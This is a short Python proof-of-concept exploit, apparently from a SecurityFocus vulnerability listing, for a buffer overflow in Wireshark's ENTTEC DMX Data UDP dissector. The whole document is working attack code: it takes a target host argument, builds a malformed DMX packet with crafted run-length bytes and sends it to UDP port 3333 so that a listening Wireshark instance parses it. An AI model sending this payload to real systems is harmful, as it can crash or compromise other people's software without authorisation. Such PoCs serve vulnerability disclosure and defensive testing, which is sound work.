# source: http://www.securityfocus.com/bid/45634/info

#!/usr/bin/env python

# Wireshark ENTTEC DMX Data (UDP) Buffer Overflow PoC
# by non-customers crew in 2010
# http://rock-madrid.com/

import socket, sys

try:
  host = sys.argv[1]
except:
  print "usage: " + sys.argv[0] + " <host>"
  sys.exit(2)

port = 3333
addr = (host, port)

data  = "ESDD\x10\x20\x04"
data += "\x00\x0c"
data += "\xfe\xff\x41"
data += "\xfe\xff\x42"
data += "\xfe\xff\x43"
data += "\xfe\xff\x44"

udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
try:
  udps.sendto(data, addr)
except:
  print "can't lookup host"
  sys.exit(1)

udps.close()
sys.exit(0)